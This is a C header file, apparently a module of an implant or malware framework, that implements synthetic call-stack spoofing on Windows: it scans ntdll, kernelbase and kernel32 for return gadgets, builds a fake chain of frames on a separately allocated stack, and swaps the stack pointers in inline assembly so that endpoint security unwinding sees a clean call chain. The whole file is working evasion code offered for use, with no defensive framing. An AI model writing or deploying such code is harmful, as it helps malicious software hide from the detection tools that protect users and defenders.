// chunk: evasion/stack_spoof_synthetic
// depends: (none)
// provides: spoof_call
// risk: none
// note: Full synthetic stack construction — allocates a separate stack region
//       and builds a complete fake call chain from scratch. The real stack is
//       never visible during the spoofed call, defeating both RBP-chain and
//       RSP-based stack unwinding. More robust than frame manipulation alone.

#ifndef CHUNK_STACK_SPOOF_SYNTHETIC
#define CHUNK_STACK_SPOOF_SYNTHETIC

#include <windows.h>

#define SYNTH_STACK_SIZE 0x10000

static PVOID _synth_stack = NULL;
static PVOID _ret_gadgets[6];
static int _synth_ready = 0;

static void _scan_module_for_rets(HMODULE mod, PVOID *out, int count, DWORD start_offset) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
    PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)((BYTE*)mod + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(pe);
    int found = 0;

    for (WORD i = 0; i < pe->FileHeader.NumberOfSections && found < count; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        BYTE *base = (BYTE*)mod + sec->VirtualAddress;
        BYTE *end = base + sec->Misc.VirtualSize;
        BYTE *p = base + start_offset;
        if (p >= end) p = base;
        for (; p < end - 1 && found < count; p++) {
            if (*p == 0xC3 && *(p-1) != 0xCC) {
                out[found++] = p;
            }
        }
    }
}

static void _init_synthetic(void) {
    if (_synth_ready) return;

    _synth_stack = VirtualAlloc(NULL, SYNTH_STACK_SIZE,
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!_synth_stack) return;

    HMODULE nt = GetModuleHandleA("ntdll.dll");
    HMODULE kb = GetModuleHandleA("kernelbase.dll");
    HMODULE k32 = GetModuleHandleA("kernel32.dll");

    if (!nt || !kb || !k32) return;

    _scan_module_for_rets(nt,  &_ret_gadgets[0], 2, 0x500);
    _scan_module_for_rets(kb,  &_ret_gadgets[2], 2, 0x300);
    _scan_module_for_rets(k32, &_ret_gadgets[4], 2, 0x200);

    _synth_ready = 1;
}

static PVOID spoof_call(PVOID func, int nargs, ...) {
    _init_synthetic();

    va_list ap;
    va_start(ap, nargs);
    PVOID a0 = nargs > 0 ? va_arg(ap, PVOID) : NULL;
    PVOID a1 = nargs > 1 ? va_arg(ap, PVOID) : NULL;
    PVOID a2 = nargs > 2 ? va_arg(ap, PVOID) : NULL;
    PVOID a3 = nargs > 3 ? va_arg(ap, PVOID) : NULL;
    va_end(ap);

    if (!_synth_ready) {
        typedef PVOID (*fn4)(PVOID, PVOID, PVOID, PVOID);
        return ((fn4)func)(a0, a1, a2, a3);
    }

    PVOID result = NULL;
    BYTE *synth_top = (BYTE*)_synth_stack + SYNTH_STACK_SIZE - 0x100;

    /* Build fake frames on the synthetic stack */
    PVOID *sp = (PVOID*)synth_top;

    /* Frame 5 (deepest): ntdll ret → NULL */
    *(--sp) = NULL;                    /* rbp terminator */
    PVOID *f5_rbp = sp;
    *(--sp) = _ret_gadgets[0];         /* ret into ntdll */

    /* Frame 4: ntdll ret → frame 5 */
    *(--sp) = f5_rbp;
    PVOID *f4_rbp = sp;
    *(--sp) = _ret_gadgets[1];

    /* Frame 3: kernel32 ret → frame 4 */
    *(--sp) = f4_rbp;
    PVOID *f3_rbp = sp;
    *(--sp) = _ret_gadgets[4];

    /* Frame 2: kernelbase ret → frame 3 */
    *(--sp) = f3_rbp;
    PVOID *f2_rbp = sp;
    *(--sp) = _ret_gadgets[2];

    /* Now switch to synthetic stack for the call */
    __asm__ __volatile__ (
        "mov %%rsp, %%r14\n\t"
        "mov %%rbp, %%r15\n\t"
        "mov %[sp], %%rsp\n\t"
        "mov %[rbp], %%rbp\n\t"
        "mov %[a0], %%rcx\n\t"
        "mov %[a1], %%rdx\n\t"
        "mov %[a2], %%r8\n\t"
        "mov %[a3], %%r9\n\t"
        "sub $0x20, %%rsp\n\t"
        "call *%[fn]\n\t"
        "mov %%rax, %[res]\n\t"
        "mov %%r14, %%rsp\n\t"
        "mov %%r15, %%rbp\n\t"
        : [res] "=m"(result)
        : [fn] "r"(func), [sp] "r"(sp), [rbp] "r"(f2_rbp),
          [a0] "m"(a0), [a1] "m"(a1), [a2] "m"(a2), [a3] "m"(a3)
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "r14", "r15", "memory"
    );

    return result;
}

#endif
